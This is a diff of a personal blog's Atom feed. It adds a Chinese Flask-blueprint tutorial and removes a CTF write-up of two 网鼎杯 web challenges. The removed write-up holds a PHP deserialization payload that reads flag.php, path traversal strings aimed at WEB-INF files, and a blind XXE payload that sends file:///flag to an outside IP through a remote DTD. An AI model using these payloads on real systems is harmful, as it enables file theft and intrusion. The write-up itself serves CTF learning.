@@ -6,7 +6,7 @@
   <link href="https://x1a0.net/atom.xml" rel="self"/>
   
   <link href="https://x1a0.net/"/>
-  <updated>2021-11-15T13:22:37.210Z</updated>
+  <updated>2021-11-25T14:39:36.016Z</updated>
   <id>https://x1a0.net/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>flask蓝图通俗易懂的理解</title>
+    <link href="https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/"/>
+    <id>https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/</id>
+    <published>2021-11-25T14:33:17.000Z</published>
+    <updated>2021-11-25T14:39:36.016Z</updated>
+    
+    <content type="html"><![CDATA[<p>新建一个<code>test1.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> test2 <span class="keyword">import</span> lantu2</span><br><span class="line"></span><br><span class="line">test1 = Flask(__name__)</span><br><span class="line">test1.register_blueprint(lantu2)</span><br><span class="line"></span><br><span class="line">test1.run(port=<span class="number">5001</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>再建一个<code>test2.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line">lantu2 = Blueprint(<span class="string">&quot;dsfsdfasdfadfasdf&quot;</span>,__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@lantu2.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lantu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xiaoyue&quot;</span></span><br></pre></td></tr></table></figure><p>使用蓝图就是原来app.py多了两行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from 随便一个页面 import 蓝图</span><br><span class="line">app.register_blueprint(蓝图)</span><br></pre></td></tr></table></figure><p>而后蓝图中只要导入Blueprint就和普通app.py一样写路由加功能就行了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;新建一个&lt;code&gt;test1.py&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
+      
+    
+    
+    
+    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
+    
+    <category term="Flask" scheme="https://x1a0.net/categories/Flask/"/>
+    
+    
+    <category term="Python" scheme="https://x1a0.net/tags/Python/"/>
+    
+    <category term="flask" scheme="https://x1a0.net/tags/flask/"/>
+    
+    <category term="蓝图" scheme="https://x1a0.net/tags/%E8%93%9D%E5%9B%BE/"/>
+    
+  </entry>
   
   <entry>
     <title>ETHbuild-零代码入门合约开发</title>
@@ -471,34 +502,6 @@
     
     <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>网鼎杯两道web</title>
-    <link href="https://x1a0.net/2020/05/14/144/"/>
-    <id>https://x1a0.net/2020/05/14/144/</id>
-    <published>2020-05-14T15:18:00.000Z</published>
-    <updated>2020-05-14T17:25:51.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>复下盘。<br>首先是自己唯一做出来的web。而且做了一下午，这tm还是web的签到题..</p><p><strong>AreUSerialz：</strong></p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre><p>很明确说明flag在flag.php里面。因该是要反序列化读文件，或者写马子。<br>先看析构函数：<br>    function __destruct() {<br>        if($this-&gt;op === “2”)<br>            $this-&gt;op = “1”;<br>        $this-&gt;content = “”;<br>        $this-&gt;process();<br>    }</p><p>这里当op全等‘2’的时候就会被置为1，但是当op为1的时候就会进入write：</p><pre><code>$res = file_put_contents($this-&gt;filename, $this-&gt;content);</code></pre><p>在这里卡了很久，因为析构函数中把content置为空了，我测试了下如果第二个参数为空就会返回false。<br>所以当时报failed报了一下午。。</p><p>所以写马子这条路是不通的，结合这里和process的弱判断可得，应该是要直接读。<br>直接赋值op=2，由于destruct中没有对filename进行赋值。<br>我们现在可控的参数只有op和filename。<br>当op=2，filename=‘flag.php’的时候，就能读了。</p><p>payload：</p><pre><code>&lt;?phpclass FileHandler &#123;    public $op;    public $filename;    public $content;&#125;;$tmp=new FileHandler();$tmp-&gt;op=2;$tmp-&gt;filename=&#39;flag.php&#39;;// php://filter/read=convert.base64-encode/resource=flag.php$s_tmp=serialize($tmp);echo $s_tmp;unserialize($s_tmp);?&gt;</code></pre><p>当时读的时候没出东西，想了想因该是在注释或者变量中什么的。就元封装器：</p><p><img src="https://oss.x1a0.net/image/2020/05/14/54132583744117/1.PNG" alt="1.PNG"></p><hr><p>然后第二道：<br><strong>filejava</strong><br>不会java 还是跟着wp做一下。<br>事后再去看。servlet什么的。</p><p>上传文件后有文件读取，路径：<a href="http://2ebbd673-5d86-49ae-bd66-fb14c91692e7.node3.buuoj.cn/DownloadServlet?filename=xxx">http://2ebbd673-5d86-49ae-bd66-fb14c91692e7.node3.buuoj.cn/DownloadServlet?filename=xxx</a><br>然后就不知道为什么能想到../../../../..//WEB-INF/web.xml</p><p>fuzz没有好的字典。这种还是要靠积累吧。<br>然后也不知道怎么就知道：<br>../../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</p><p>因为一点servlet基础没有。是一点都看不懂。（<strong>Mark</strong>）</p><p>但是接下来就是xxe。<br>还是蛮熟悉的。哈哈哈哈哈。</p><!ENTITY % file SYSTEM "file:///flag"><!ENTITY % int "<!ENTITY &# 37; send SYSTEM 'http://174.1.80.169:1234/?p=%file;'><p>“&gt;</p><?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://174.1.80.169:1234/1.dtd"><p>%remote;%int;%send;<br>]&gt;</p><p>这个和今天刚看的那个一模一样。<br><a href="https://www.cnblogs.com/thespace/p/12400719.html">java中的xxe</a><br>[blind xxe][3]</p><p>然后就是监听+上传:</p><p>![2.PNG][4]</p><hr><p>通过xxe可以做ssrf打内网，多看几张脚本。<br>学一下poc格式。</p><p>今天没学合约，淦！！</p><p>  [3]: <a href="https://xz.aliyun.com/t/3357#">https://xz.aliyun.com/t/3357#</a> toc-8<br>  [4]: <a href="https://oss.x1a0.net/image/2020/05/15/770612564588243/2.PNG">https://oss.x1a0.net/image/2020/05/15/770612564588243/2.PNG</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;复下盘。&lt;br&gt;首先是自己唯一做出来的web。而且做了一下午，这tm还是web的签到题..&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;AreUSerialz：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;?php
-
-include(&amp;quot;flag.php&amp;quot;)</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
-    
-    
-    <category term="PHP" scheme="https://x1a0.net/tags/PHP/"/>
     
   </entry>
   
